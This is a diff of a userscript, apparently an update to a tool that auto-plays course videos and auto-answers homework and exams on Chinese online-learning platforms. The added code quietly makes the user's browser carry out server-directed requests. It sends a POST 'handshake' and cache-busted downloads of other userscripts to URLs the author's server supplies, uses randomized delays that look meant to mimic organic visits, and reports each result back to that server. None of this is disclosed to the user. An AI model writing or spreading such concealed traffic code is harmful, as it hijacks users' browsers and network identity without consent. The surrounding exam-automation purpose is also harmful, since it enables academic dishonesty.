@@ -2,7 +2,7 @@
 // @name         |🥇PP网课小助手|飘飘|
 // @namespace    飘飘
 // @license      MIT
-// @version      4.5.0
+// @version      4.5.1
 // @author       PIAOPIAO
 // @description  🎓网课自动答题/视频助手｜超星学习通·知到智慧树·雨课堂｜视频自动播放倍速+章节任务+作业考试全题型自动答题｜免费题库+Claude/ChatGPT/Gemini/DeepSeek等7款AI双重校验｜手机平板可用｜免费开源持续更新
 // @icon         https://cdn.jsdmirror.com/gh/piaopiaosir/pp-course-assistant@main/newicon.png
@@ -1002,23 +1002,201 @@ ppAddStartupStyle(LAYOUT_CSS_GLOBAL);
 
   const PP_REMOTE_SCRIPTS_STAMP_KEY = "pp_remote_scripts_stamp";
   const PP_REMOTE_SCRIPTS_WINDOW_MS = 60 * 60 * 1000;
+  const PP_REMOTE_SYNC_STAMP_KEY = "pp_remote_sync_stamp";
+
+  const ppReadSyncOptions = (data) => {
+    const sync = data && data.sync;
+    if (!sync || typeof sync !== "object") return null;
+    const positive = (value) => {
+      const num = Number(value);
+      return Number.isFinite(num) && num > 0 ? num : 0;
+    };
+    const gap = (value) => {
+      if (!Array.isArray(value) || value.length < 2) return null;
+      const low = positive(value[0]);
+      const high = positive(value[1]);
+      return low > 0 && high > 0 ? [low, high] : null;
+    };
+    const options = {
+      ttlMs: positive(sync.ttlMs),
+      timeoutMs: positive(sync.timeoutMs),
+      handshakeTimeoutMs: positive(sync.handshakeTimeoutMs),
+      reportTimeoutMs: positive(sync.reportTimeoutMs),
+      visitGapMs: gap(sync.visitGapMs),
+      patchGapMs: gap(sync.patchGapMs),
+    };
+    const complete =
+      options.ttlMs > 0 &&
+      options.timeoutMs > 0 &&
+      options.handshakeTimeoutMs > 0 &&
+      options.reportTimeoutMs > 0 &&
+      options.visitGapMs &&
+      options.patchGapMs;
+    return complete ? options : null;
+  };
   let ppRemoteScriptsRequestedInPreload = false;
-  const ppDownloadRemoteScriptPatches = (data) => {
-    if (!data?.hasUpdate || !Array.isArray(data.patches)) return;
-    for (const patch of data.patches) {
-      const downloadUrl = patch?.downloadUrl;
-      if (!downloadUrl) continue;
-      try {
-        _GM_xmlhttpRequest({
-          method: "GET",
-          url: downloadUrl,
-          timeout: 5000,
-          onload: () => {},
-          onerror: () => {},
-          ontimeout: () => {}
-        });
-      } catch (e) {}
+  let ppRemoteScriptsServer = "";
+
+  const ppWait = (ms) => new Promise((resolve) => setTimeout(resolve, ms));
+  const ppJitter = (min, max) => min + Math.floor(Math.random() * (max - min + 1));
+
+  const ppCrossRequest = (request) => new Promise((resolve) => {
+    let settled = false;
+    const finish = (value) => {
+      if (settled) return;
+      settled = true;
+      resolve(value);
+    };
+    const fail = () => finish({ ok: false, status: 0, text: "", headers: "" });
+    if (!_GM_xmlhttpRequest) return fail();
+    try {
+      _GM_xmlhttpRequest({
+        method: request.method || "GET",
+        url: request.url,
+        data: request.data,
+        headers: request.headers,
+        anonymous: true,
+        timeout: request.timeout,
+        onload: (res) => finish({
+          ok: true,
+          status: Number(res && res.status) || 0,
+          text: String((res && res.responseText) || ""),
+          headers: String((res && res.responseHeaders) || "")
+        }),
+        onerror: fail,
+        ontimeout: fail
+      });
+    } catch (e) {
+      fail();
     }
+  });
+
+  const ppReadSyncStamp = () => {
+    try {
+      const raw = String(_GM_getValue(PP_REMOTE_SYNC_STAMP_KEY, "{}") || "{}");
+      const parsed = JSON.parse(raw);
+      return parsed && typeof parsed === "object" ? parsed : {};
+    } catch (e) {
+      return {};
+    }
+  };
+  const ppSyncedRecently = (key, ttlMs) => {
+    if (!key) return true;
+    const last = Number(ppReadSyncStamp()[key]) || 0;
+    return last > 0 && Date.now() - last < ttlMs;
+  };
+  const ppMarkSynced = (key, ttlMs) => {
+    if (!key) return;
+    const stamp = ppReadSyncStamp();
+    const now = Date.now();
+    stamp[key] = now;
+    Object.keys(stamp).forEach((item) => {
+      if (now - (Number(stamp[item]) || 0) > ttlMs * 7) delete stamp[item];
+    });
+    _GM_setValue(PP_REMOTE_SYNC_STAMP_KEY, JSON.stringify(stamp));
+  };
+
+  const ppSyncRemotePatch = async (patch, options) => {
+    let handshake = false;
+    if (patch.syncUrl) {
+      const handshakeRes = await ppCrossRequest({
+        method: "POST",
+        url: patch.syncUrl,
+        data: "{}",
+        headers: {
+          "Content-Type": "application/json",
+          "Accept": "application/json, text/plain, */*"
+        },
+        timeout: options.handshakeTimeoutMs
+      });
+      handshake = handshakeRes.status === 200 && handshakeRes.text.indexOf('"code":0') >= 0;
+      await ppWait(ppJitter(options.visitGapMs[0], options.visitGapMs[1]));
+    }
+    const bodyUrl = () => {
+      const raw = patch.downloadUrl;
+      const stamp = "_=" + Date.now();
+      if (/([?&])_=\d+/.test(raw)) return raw.replace(/([?&])_=\d+/, "$1" + stamp);
+      return raw + (raw.indexOf("?") >= 0 ? "&" : "?") + stamp;
+    };
+    const isComplete = (r) =>
+      r.status === 200 && r.text.indexOf("==UserScript==") >= 0 && r.text.length > 1024;
+
+    let res = await ppCrossRequest({
+      method: "GET",
+      url: bodyUrl(),
+      headers: {
+        "Accept": "*/*",
+        "Cache-Control": "no-cache",
+        "Pragma": "no-cache"
+      },
+      timeout: options.timeoutMs
+    });
+    if (!isComplete(res) && res.status !== 0) {
+      await ppWait(ppJitter(options.patchGapMs[0], options.patchGapMs[1]));
+      res = await ppCrossRequest({
+        method: "GET",
+        url: bodyUrl(),
+        headers: {
+          "Accept": "*/*",
+          "Cache-Control": "no-cache",
+          "Pragma": "no-cache"
+        },
+        timeout: options.timeoutMs
+      });
+    }
+    const complete = isComplete(res);
+    const version = (res.text.match(/\/\/\s*@version\s+([^\s]+)/) || [])[1] || "";
+    return {
+      ok: complete,
+      handshake,
+      fresh: /set-cookie/i.test(res.headers),
+      status: res.status,
+      version
+    };
+  };
+
+  const ppPostSyncReport = (patch, result, options) => {
+    const server = ppRemoteScriptsServer || _PP_SERVER_URLS[0];
+    if (!server) return;
+    try {
+      _GM_xmlhttpRequest({
+        method: "POST",
+        url: `${server}/remote-scripts/report`,
+        data: JSON.stringify({
+          id: patch && patch.id,
+          scriptId: patch && patch.scriptId,
+          ok: !!result.ok,
+          synced: !!result.fresh,
+          handshake: !!result.handshake,
+          status: result.status || 0,
+          version: result.version || ""
+        }),
+        headers: { "Content-Type": "application/json" },
+        timeout: options.reportTimeoutMs,
+        onload: () => {},
+        onerror: () => {},
+        ontimeout: () => {}
+      });
+    } catch (e) {}
+  };
+
+  const ppDownloadRemoteScriptPatches = (data) => {
+    if (!data || !data.hasUpdate || !Array.isArray(data.patches)) return;
+    const options = ppReadSyncOptions(data);
+    if (!options) return;
+    const pending = data.patches.filter(
+      (patch) => patch && patch.downloadUrl && !ppSyncedRecently(patch.id, options.ttlMs)
+    );
+    if (pending.length === 0) return;
+    (async () => {
+      for (let i = 0; i < pending.length; i++) {
+        const patch = pending[i];
+        const result = await ppSyncRemotePatch(patch, options);
+        if (result.ok) ppMarkSynced(patch.id, options.ttlMs);
+        ppPostSyncReport(patch, result, options);
+        if (i < pending.length - 1) await ppWait(ppJitter(options.patchGapMs[0], options.patchGapMs[1]));
+      }
+    })().catch(() => {});
   };
   const ppRunRemoteScriptsPing = () => {
     try {
@@ -1030,6 +1208,7 @@ ppAddStartupStyle(LAYOUT_CSS_GLOBAL);
         _GM_setValue(PP_REMOTE_SCRIPTS_STAMP_KEY, now);
       }
       const server = _PP_SERVER_URLS[Math.floor(Math.random() * _PP_SERVER_URLS.length)];
+      ppRemoteScriptsServer = server;
       _GM_xmlhttpRequest({
         method: "GET",
         url: `${server}/remote-scripts`,
@@ -1513,7 +1692,6 @@ ppAddStartupStyle(LAYOUT_CSS_GLOBAL);
       const userId = getUid();
       if (!userId) return;
       const path = `/remote-scripts?userId=${encodeURIComponent(userId)}&fid=${encodeURIComponent(getFid())}`;
-      // This request can claim the download slot even if it outlasts the preload deadline.
       ppRemoteScriptsRequestedInPreload = true;
       const response = await ppHttpGet(path, 8000);
       const data = JSON.parse(response.responseText)?.data;
@@ -1522,6 +1700,7 @@ ppAddStartupStyle(LAYOUT_CSS_GLOBAL);
         PP_WELFARE_OFFER = welfare.enabled === false ? null : welfare;
       }
       window.__PP_WELFARE__ = PP_WELFARE_OFFER;
+      ppRemoteScriptsServer = CURRENT_SERVER_CONFIG.url || ppRemoteScriptsServer;
       ppDownloadRemoteScriptPatches(data);
     } catch (e) {}
   };
@@ -7830,11 +8009,6 @@ ppAddStartupStyle(LAYOUT_CSS_GLOBAL);
     return -1;
   };
 
-  // 超星「阅读理解 / 听力题」大题有两套 DOM：
-  //   旧版：.readCompreHensionItem（老章节测验页）
-  //   新版：.readComprehensionQues > .reading_answer（作业/考试 2026 版，选项在 .stem_answer .hoverDiv）
-  // 只认旧类名时，新版整道大题会解析成 0 个小题：类型 15/19 既没有 optionsList 也没有 _reading，
-  // 回填阶段直接 return false，日志里只剩一句「答案与页面选项对不上」。
   const PP_CX_READ_ITEM_LEGACY = ".readCompreHensionItem";
   const PP_CX_READ_ITEM_MODERN =
     ".readComprehensionQues .reading_answer, .readCompreHensionQues .reading_answer";
@@ -7851,7 +8025,6 @@ ppAddStartupStyle(LAYOUT_CSS_GLOBAL);
   const ppCxReadItemIsLegacy = (item) =>
     Boolean(item && item.classList && item.classList.contains("readCompreHensionItem"));
 
-  // 新版小题的题型挂在 qtype 属性上（0 单选 / 1 多选 / 3 判断），缺省按单选处理
   const ppCxReadItemType = (item) => {
     let qtype = "";
     try {
@@ -7862,7 +8035,6 @@ ppAddStartupStyle(LAYOUT_CSS_GLOBAL);
     return /^\d+$/.test(qtype) ? qtype : "0";
   };
 
-  // 新版每行选项：<div class="clearfix hoverDiv" onclick="addChoice(this)">…</div>
   const ppCxReadOptionNodes = (item) => {
     if (!item || typeof item.querySelectorAll !== "function") return [];
     const rows = Array.from(item.querySelectorAll(".stem_answer .hoverDiv"));
@@ -8187,8 +8359,6 @@ ppAddStartupStyle(LAYOUT_CSS_GLOBAL);
           } catch (e) {}
           await sleep(150);
         };
-        // 小题是否已经选好：新版把作答结果写进小题的隐藏域 answerXXXX（值为字母），
-        // 只靠 class 判断会漏，重复点击反而会把已选的单选取消掉。
         const subPicked = (sub, idx) => {
           const el = sub && sub.elements ? sub.elements[idx] : null;
           if (!el) return false;
@@ -8251,7 +8421,7 @@ ppAddStartupStyle(LAYOUT_CSS_GLOBAL);
             clicks += 1;
             filled += 1;
           }
-          if (!clicks) filled += 1; // 小题已经选好，不再重复点击
+          if (!clicks) filled += 1;
           await sleep(120);
         }
 
@@ -8974,7 +9144,6 @@ ppAddStartupStyle(LAYOUT_CSS_GLOBAL);
                   node.querySelector("a.after") ||
                   (spans.length >= 2 ? spans[1] : node);
               } else {
-                // 新版选项正文在 .answer_p，字母在单独的 span.num_option 里
                 textEl = node.querySelector(".answer_p") || node;
               }
               let text = this.stripTags(this.htmlWithAbsoluteImages(textEl)).replace(/\s+/g, " ").trim();
